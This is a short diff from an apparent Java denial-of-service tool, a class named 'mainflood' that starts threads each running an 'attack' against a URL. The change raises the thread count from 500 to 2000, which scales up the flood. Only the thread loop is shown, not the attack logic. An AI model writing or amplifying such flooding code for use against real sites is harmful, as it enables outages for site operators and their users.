@@ -76,7 +76,7 @@ public class mainflood {
 
         ArrayList<Thread> threads = new ArrayList<Thread>();
 
-        for (int i = 0; i < 500; i++) {
+        for (int i = 0; i < 2000; i++) {
 
             Thread t = new Thread(new attack(url));
 
